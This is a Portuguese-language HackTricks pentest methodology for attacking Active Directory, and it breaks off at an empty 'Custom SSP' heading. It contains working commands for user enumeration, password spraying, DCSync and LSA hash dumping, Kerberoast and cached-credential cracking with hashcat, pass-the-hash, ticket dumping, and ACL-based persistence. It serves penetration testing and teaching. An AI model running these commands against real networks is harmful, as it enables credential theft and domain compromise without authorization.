# Metodologia do Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Visão geral básica

**Active Directory** serve como uma tecnologia fundamental, permitindo que **administradores de rede** criem e gerenciem de forma eficiente **domínios**, **usuários** e **objetos** dentro de uma rede. É projetado para escalar, facilitando a organização de um grande número de usuários em **grupos** e **subgrupos** gerenciáveis, enquanto controla **direitos de acesso** em vários níveis.

A estrutura do **Active Directory** é composta por três camadas principais: **domínios**, **trees**, e **forests**. Um **domínio** abrange uma coleção de objetos, como **usuários** ou **dispositivos**, compartilhando um banco de dados comum. **Trees** são grupos desses domínios ligados por uma estrutura compartilhada, e uma **forest** representa a coleção de múltiplas trees, interconectadas por **trust relationships**, formando a camada superior da estrutura organizacional. Direitos específicos de **acesso** e **comunicação** podem ser designados em cada um desses níveis.

Conceitos chave dentro do **Active Directory** incluem:

1. **Directory** – Abriga todas as informações referentes aos objetos do Active Directory.
2. **Object** – Denota entidades dentro do diretório, incluindo **usuários**, **grupos** ou **pastas compartilhadas**.
3. **Domain** – Serve como um contêiner para objetos do diretório, com a capacidade de múltiplos domínios coexistirem dentro de uma **forest**, cada um mantendo sua própria coleção de objetos.
4. **Tree** – Um agrupamento de domínios que compartilham um domínio raiz comum.
5. **Forest** – O ponto mais alto da estrutura organizacional no Active Directory, composto por várias trees com **trust relationships** entre elas.

**Active Directory Domain Services (AD DS)** engloba uma série de serviços críticos para o gerenciamento centralizado e comunicação dentro de uma rede. Esses serviços compreendem:

1. **Domain Services** – Centraliza o armazenamento de dados e gerencia as interações entre **usuários** e **domínios**, incluindo funcionalidades de **authentication** e **search**.
2. **Certificate Services** – Supervisiona a criação, distribuição e gerenciamento de **digital certificates** seguros.
3. **Lightweight Directory Services** – Suporta aplicações habilitadas para diretório através do **LDAP protocol**.
4. **Directory Federation Services** – Fornece capacidades de **single-sign-on** para autenticar usuários através de múltiplas aplicações web em uma única sessão.
5. **Rights Management** – Auxilia na proteção de material com direitos autorais regulando sua distribuição e uso não autorizados.
6. **DNS Service** – Crucial para a resolução de **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Resumo Rápido

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (Sem credenciais/sessões)

Se você tem acesso a um ambiente AD mas não possui credenciais/sessões, você pode:

- **Pentest the network:**
- Faça scan da rede, encontre máquinas e portas abertas e tente **explorar vulnerabilidades** ou **extrair credenciais** delas (por exemplo, [printers could be very interesting targets](ad-information-in-printers.md)).
- Enumerar DNS pode fornecer informações sobre servidores-chave no domínio como web, printers, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Dê uma olhada na página geral [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) para encontrar mais informação sobre como fazer isso.
- **Verificar acesso null e Guest em serviços smb** (isso não funcionará em versões modernas do Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Um guia mais detalhado sobre como enumerar um servidor SMB pode ser encontrado aqui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerar Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Um guia mais detalhado sobre como enumerar LDAP pode ser encontrado aqui (preste **atenção especial ao acesso anônimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Coletar credenciais [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Acessar hosts [**abusando do relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Coletar credenciais **expondo** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extrair nomes de usuário/nomes de documentos internos, redes sociais, serviços (principalmente web) dentro dos ambientes do domínio e também dos disponíveis publicamente.
- Se você encontrar os nomes completos dos funcionários da empresa, você pode tentar diferentes convenções de **username** do AD (**[read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)**). As convenções mais comuns são:** _NameSurname_, _Name.Surname_, _NamSur_ (3 letras de cada), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _letras aleatórias e 3 números aleatórios_ (abc123).
- Ferramentas:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeração de usuários

- **Anonymous SMB/LDAP enum:** Consulte as páginas de [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Quando um **username inválido é requisitado** o servidor responderá usando o **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permitindo-nos determinar que o username era inválido. **Usernames válidos** irão provocar ou o **TGT em um AS-REP** response ou o erro _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando que o usuário é obrigado a realizar pre-authentication.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contra a interface MS-NRPC (Netlogon) em domain controllers. O método chama a função `DsrGetDcNameEx2` após bind na interface MS-NRPC para verificar se o usuário ou computador existe sem quaisquer credenciais. A ferramenta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa esse tipo de enumeração. A pesquisa pode ser encontrada [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Se você encontrar um desses servidores na rede, também pode realizar **user enumeration** contra ele. Por exemplo, você pode usar a ferramenta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Knowing one or several usernames

Ok, então você já sabe que tem um username válido mas sem passwords... Então tente:

- [**ASREPRoast**](asreproast.md): Se um usuário **não tem** o atributo _DONT_REQ_PREAUTH_ você pode **request a AS_REP message** para esse usuário que vai conter alguns dados criptografados por uma derivação da password do usuário.
- [**Password Spraying**](password-spraying.md): Vamos tentar as **passwords mais comuns** com cada um dos users descobertos, talvez algum usuário esteja usando uma password fraca (lembre-se da password policy!).
- Note que você também pode **spray OWA servers** para tentar obter acesso aos mail servers dos users.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Você pode ser capaz de **obter** alguns challenge **hashes** para crackar ao **poisoning** alguns protocolos da **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Se você conseguiu enumerar o Active Directory você terá **mais emails e um melhor entendimento da network**. Você pode ser capaz de forçar NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) para obter acesso ao ambiente AD.

### Steal NTLM Creds

Se você pode **acessar outros PCs ou shares** com o **null or guest user** você poderia **colocar arquivos** (como um arquivo SCF) que, se de alguma forma acessados, irão **trigger an NTLM authentication against you** para que você possa **steal** o **NTLM challenge** para cracká-lo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** trata cada NT hash que você já possui como uma senha candidata para outros formatos mais lentos cujos materiais de chave são derivados diretamente do NT hash. Em vez de brute-forcear longas passphrases em Kerberos RC4 tickets, NetNTLM challenges, ou cached credentials, você injeta os NT hashes nos modos NT-candidate do Hashcat e deixa ele validar o reuse de senhas sem nunca aprender o plaintext. Isso é especialmente potente após um compromisso de domínio onde você pode colher milhares de NT hashes atuais e históricos.

Use shucking quando:

- Você tem um corpus de NT de DCSync, dumps SAM/SECURITY, ou credential vaults e precisa testar reuse em outros domínios/florestas.
- Você captura material Kerberos baseado em RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), respostas NetNTLM, ou blobs DCC/DCC2.
- Você quer provar rapidamente o reuse para longas passphrases inquebráveis e pivotar imediatamente via Pass-the-Hash.

A técnica **não funciona** contra tipos de criptografia cujas chaves não são o NT hash (ex., Kerberos etype 17/18 AES). Se um domínio aplica AES-only, você deve voltar aos modos regulares de password.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` com history para pegar o maior conjunto possível de NT hashes (e seus valores anteriores):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Entradas de history ampliam dramaticamente o pool de candidatos porque a Microsoft pode armazenar até 24 hashes anteriores por conta. Para mais formas de colher segredos do NTDS veja:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrai dados locais SAM/SECURITY e cached domain logons (DCC/DCC2). Desduplique e adicione esses hashes ao mesmo `nt_candidates.txt`.
- **Track metadata** – Mantenha o username/domain que produziu cada hash (mesmo se o wordlist contiver apenas hex). Hashes correspondentes dizem imediatamente qual principal está reutilizando uma senha assim que o Hashcat imprimir o candidato vencedor.
- Prefira candidatos da mesma forest ou de uma trusted forest; isso maximiza a chance de overlap quando shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notas:

- NT-candidate inputs **devem permanecer** raw 32-hex NT hashes. Desative rule engines (sem `-r`, sem modos híbridos) porque mangling corrompe o key material candidato.
- Esses modos não são intrinsecamente mais rápidos, mas o keyspace NTLM (~30,000 MH/s em um M3 Max) é ~100× mais rápido que Kerberos RC4 (~300 MH/s). Testar uma lista NT curada é muito mais barato do que explorar todo o espaço de senhas no formato lento.
- Sempre rode a **última build do Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) porque os modos 31500/31600/35300/35400 foram lançados recentemente.
- Atualmente não existe um modo NT para AS-REQ Pre-Auth, e etypes AES (19600/19700) requerem o plaintext da password porque suas chaves são derivadas via PBKDF2 de passwords UTF-16LE, não de raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture um RC4 TGS para um SPN alvo com um usuário de baixo privilégio (veja a página Kerberoast para detalhes):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket com sua NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva a RC4 key de cada NT candidate e valida o blob `$krb5tgs$23$...`. Um match confirma que a service account usa um dos seus NT hashes existentes.

3. Imediatamente pivote via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Você pode opcionalmente recuperar o plaintext mais tarde com `hashcat -m 1000 <matched_hash> wordlists/` se necessário.

#### Example – Cached credentials (mode 31600)

1. Dummpe cached logons de uma workstation comprometida:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copie a linha DCC2 do usuário de domínio interessante para `dcc2_highpriv.txt` e shuck ela:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Um match bem-sucedido fornece o NT hash já conhecido na sua lista, provando que o usuário cached está reutilizando uma senha. Use-o diretamente para PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ou brute-forceie em modo NTLM rápido para recuperar a string.

O mesmo fluxo aplica-se a NetNTLM challenge-responses (`-m 27000/27100`) e DCC (`-m 31500`). Uma vez identificado um match você pode lançar relay, SMB/WMI/WinRM PtH, ou re-crackar o NT hash com masks/rules offline.



## Enumerating Active Directory WITH credentials/session

Para esta fase você precisa ter **comprometido as credentials ou uma session de uma conta de domínio válida.** Se você tem algumas credentials válidas ou um shell como domain user, **você deve lembrar que as opções dadas antes ainda são opções para comprometer outros usuários**.

Antes de começar a enumeração autenticada você deve saber qual é o **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Ter comprometido uma conta é um **grande passo para começar a comprometer todo o domínio**, porque você vai poder iniciar a **Active Directory Enumeration:**

Sobre [**ASREPRoast**](asreproast.md) você agora pode encontrar todo usuário potencialmente vulnerável, e sobre [**Password Spraying**](password-spraying.md) você pode obter uma **lista de todos os usernames** e tentar a password da conta comprometida, passwords vazias e novas passwords promissoras.

- Você poderia usar o [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Você também pode usar [**powershell for recon**](../basic-powershell-for-pentesters/index.html) que será mais stealthy
- Você também pode [**use powerview**](../basic-powershell-for-pentesters/powerview.md) para extrair informações mais detalhadas
- Outra ferramenta incrível para recon em Active Directory é [**BloodHound**](bloodhound.md). Ela **não é muito stealthy** (dependendo dos métodos de collection que você usar), mas **se você não se importa** com isso, você definitivamente deveria tentar. Encontre onde users podem RDP, caminhos para outros grupos, etc.
- **Outras ferramentas automatizadas de enumeração AD são:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) pois podem conter informação interessante.
- Uma **ferramenta com GUI** que você pode usar para enumerar o diretório é **AdExplorer.exe** da **SysInternal** Suite.
- Você também pode buscar na base LDAP com **ldapsearch** para procurar credentials em campos _userPassword_ & _unixUserPassword_, ou mesmo em _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) para outros métodos.
- Se você está usando **Linux**, você também pode enumerar o domínio usando [**pywerview**](https://github.com/the-useless-one/pywerview).
- Você também pode tentar ferramentas automatizadas como:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

É muito fácil obter todos os usernames do domínio no Windows (`net user /domain` ,`Get-DomainUser` ou `wmic useraccount get name,sid`). No Linux, você pode usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Mesmo que esta seção Enumeration pareça pequena, esta é a parte mais importante de todas. Acesse os links (principalmente os de cmd, powershell, powerview e BloodHound), aprenda a enumerar um domínio e pratique até se sentir confortável. Durante uma avaliação, este será o momento chave para encontrar seu caminho até DA ou para decidir que nada pode ser feito.

### Kerberoast

Kerberoasting envolve obter **TGS tickets** usados por serviços ligados a contas de usuário e crackar sua criptografia — que é baseada nas passwords dos usuários — **offline**.

Mais sobre isso em:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Uma vez que você obteve algumas credentials você pode checar se tem acesso a alguma **machine**. Para isso, você pode usar **CrackMapExec** para tentar conectar em vários servers com diferentes protocolos, de acordo com seus port scans.

### Local Privilege Escalation

Se você comprometeu credentials ou uma session como um regular domain user e você tem **acesso** com esse usuário a **qualquer máquina no domínio** você deve tentar encontrar uma forma de **escalar privilégios localmente e lootear por credentials**. Isso porque só com privilégios de administrador local você será capaz de **dump hashes de outros usuários** na memória (LSASS) e localmente (SAM).

Há uma página completa neste livro sobre [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) e um [**checklist**](../checklist-windows-privilege-escalation.md). Além disso, não esqueça de usar [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

É muito **improvável** que você encontre **tickets** no usuário atual que te deem permissão para acessar recursos inesperados, mas você pode checar:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Se você conseguiu enumerar o Active Directory terá **mais e-mails e uma melhor compreensão da rede**. Você talvez consiga forçar NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Agora que você tem algumas credentials básicas deve verificar se consegue **encontrar** quaisquer **arquivos interessantes sendo compartilhados dentro do AD**. Você pode fazer isso manualmente, mas é uma tarefa muito entediante e repetitiva (ainda mais se encontrar centenas de docs que precisa checar).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Se você conseguir **acessar outros PCs ou shares** pode **colocar arquivos** (como um SCF file) que, se de alguma forma acessados, irão **disparar uma autenticação NTLM contra você** para que você possa **steal** o **NTLM challenge** para cracká-lo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Essa vulnerabilidade permitia que qualquer usuário autenticado **comprometesse o domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Para as técnicas a seguir, um usuário comum do domínio não é suficiente; você precisa de privilégios/credentials especiais para executar esses ataques.**

### Hash extraction

Esperançosamente você conseguiu **comprometer alguma conta de administrador local** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) incluindo relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Then, its time to dump all the hashes in memory and locally.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Uma vez que você tenha o hash de um usuário**, pode usá-lo para **impersonate** esse usuário.\
Você precisa usar alguma **tool** que **perform** a **NTLM authentication using** esse **hash**, **ou** pode criar um novo **sessionlogon** e **inject** esse **hash** dentro do **LSASS**, assim, quando qualquer **NTLM authentication is performed**, esse **hash será usado.** A última opção é o que mimikatz faz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

No método de ataque **Pass The Ticket (PTT)**, os atacantes **roubam o ticket de autenticação de um usuário** em vez de sua senha ou valores de hash. Esse ticket roubado é então usado para **se passar pelo usuário**, obtendo acesso não autorizado a recursos e serviços dentro de uma rede.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Se você tiver o **hash** ou a **password** de um **administrador local**, deve tentar **fazer login localmente** em outros **PCs** com ele.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Observe que isto é bastante **ruidoso** e o **LAPS** o **mitigaria**.

### MSSQL Abuse & Trusted Links

Se um usuário tem privilégios para **acessar instâncias MSSQL**, ele pode usar isso para **executar comandos** no host MSSQL (se estiver em execução como SA), **roubar** o NetNTLM **hash** ou até realizar um **relay attack**.\
Além disso, se uma instância MSSQL for confiada (database link) por uma instância MSSQL diferente, e o usuário tiver privilégios sobre o banco de dados confiado, ele poderá **usar a relação de confiança para executar consultas também na outra instância**. Essas relações de confiança podem ser encadeadas e, em algum ponto, o usuário pode encontrar um banco de dados mal configurado onde pode executar comandos.\
**As ligações entre bancos de dados funcionam mesmo através de forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Suites de inventário e implantação de terceiros frequentemente expõem caminhos poderosos para credenciais e execução de código. Veja:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se você encontrar qualquer objeto Computer com o atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e você tiver privilégios de domínio no computador, você poderá despejar TGTs da memória de todos os usuários que fizerem login no computador.\
Assim, se um **Domain Admin fizer login no computador**, você poderá extrair seu TGT e se passar por ele usando [Pass the Ticket](pass-the-ticket.md).\
Graças ao constrained delegation você pode até **comprometer automaticamente um Print Server** (esperançosamente será um DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se um usuário ou computador está autorizado para "Constrained Delegation" ele poderá **assumir a identidade de qualquer usuário para acessar alguns serviços em um computador**.\
Então, se você **comprometer o hash** desse usuário/computador, você poderá **assumir a identidade de qualquer usuário** (até domain admins) para acessar certos serviços.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Ter privilégio de **WRITE** em um objeto Active Directory de um computador remoto permite obter execução de código com **privilégios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

O usuário comprometido pode ter alguns **privilégios interessantes sobre certos objetos do domínio** que podem permitir que você **mova-se lateralmente**/**eleve privilégios**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Descobrir um **serviço Spool ouvindo** dentro do domínio pode ser **abusado** para **obter novas credenciais** e **elevar privilégios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Se **outros usuários** **acessarem** a máquina **comprometida**, é possível **coletar credenciais da memória** e até **injetar beacons nos processos deles** para se passar por eles.\
Normalmente os usuários acessam o sistema via RDP, então aqui estão como realizar um par de ataques sobre sessões RDP de terceiros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

O LAPS fornece um sistema para gerenciar a **senha do Administrator local** em computadores juntados ao domínio, assegurando que ela seja **randomizada**, única e frequentemente **alterada**. Essas senhas são armazenadas no Active Directory e o acesso é controlado por ACLs apenas para usuários autorizados. Com permissões suficientes para acessar essas senhas, torna-se possível pivotar para outros computadores.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Coletar certificados da máquina comprometida pode ser uma forma de escalar privilégios dentro do ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Se **templates vulneráveis** estiverem configurados, é possível abusar deles para escalar privilégios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Uma vez que você obtenha privilégios de **Domain Admin** ou, ainda melhor, **Enterprise Admin**, você pode **extrair** o **banco de dados do domínio**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Algumas das técnicas discutidas anteriormente podem ser usadas para persistência.\
Por exemplo, você poderia:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

O **Silver Ticket attack** cria um **Ticket Granting Service (TGS) válido** para um serviço específico usando o **NTLM hash** (por exemplo, o **hash da conta do PC**). Esse método é empregado para **acessar os privilégios do serviço**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Um **Golden Ticket attack** envolve o atacante obter acesso ao **NTLM hash da conta krbtgt** em um ambiente Active Directory (AD). Essa conta é especial porque é usada para assinar todos os **Ticket Granting Tickets (TGTs)**, que são essenciais para autenticação na rede AD.

Uma vez que o atacante obtém esse hash, ele pode criar **TGTs** para qualquer conta que desejar (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

São como golden tickets forjados de forma a **burlar mecanismos comuns de detecção de golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Ter certificados de uma conta ou ser capaz de solicitá-los** é uma ótima forma de persistir na conta do usuário (mesmo que ele troque a senha):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Usar certificados também possibilita persistir com altos privilégios dentro do domínio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

O objeto **AdminSDHolder** no Active Directory garante a segurança de **grupos privilegiados** (como Domain Admins e Enterprise Admins) aplicando uma **Access Control List (ACL)** padrão a esses grupos para evitar alterações não autorizadas. Entretanto, esse recurso pode ser explorado; se um atacante modificar a ACL do AdminSDHolder para conceder acesso total a um usuário comum, esse usuário ganha controle extenso sobre todos os grupos privilegiados. Essa medida de segurança, destinada a proteger, pode voltar-se contra, permitindo acesso indevido a menos que seja rigorosamente monitorada.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Em cada **Domain Controller (DC)** existe uma conta de **administrador local**. Ao obter direitos de admin numa máquina assim, o hash do local Administrator pode ser extraído usando **mimikatz**. Em seguida, é necessária uma modificação no registro para **habilitar o uso dessa senha**, permitindo o acesso remoto à conta local Administrator.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Você pode **conceder** algumas **permissões especiais** a um **usuário** sobre certos objetos do domínio que permitirão ao usuário **elevar privilégios no futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Os **security descriptors** são usados para **armazenar** as **permissões** que um **objeto** tem **sobre** um recurso. Se você puder apenas **fazer** uma **pequena alteração** no **security descriptor** de um objeto, pode obter privilégios muito interessantes sobre esse objeto sem precisar ser membro de um grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Altere o **LSASS** na memória para estabelecer uma **senha universal**, concedendo acesso a todas as contas do domínio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

